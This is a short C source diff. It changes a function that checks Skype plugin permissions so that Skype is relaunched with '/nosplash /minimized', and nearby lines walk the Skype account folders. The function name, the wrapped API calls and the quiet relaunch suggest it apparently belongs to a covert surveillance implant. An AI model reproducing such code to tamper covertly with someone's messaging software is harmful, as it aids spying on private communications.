@@ -2095,7 +2095,7 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 		return;
 	wcscat_s(skype_data, MAX_PATH, L"\\Skype\\");
 	_snwprintf_s(skype_search, sizeof(skype_search)/sizeof(WCHAR), _TRUNCATE, L"%s\\*", skype_data); 
-	_snprintf_s(skype_exe_path, sizeof(skype_exe_path), _TRUNCATE, "%S\\Phone\\Skype.exe", skype_path); 
+	_snprintf_s(skype_exe_path, sizeof(skype_exe_path), _TRUNCATE, "%S\\Phone\\Skype.exe /nosplash /minimized", skype_path); 
 
 	// Cicla tutte le directory degli account
 	hFind = FNC(FindFirstFileW)(skype_search, &find_data);
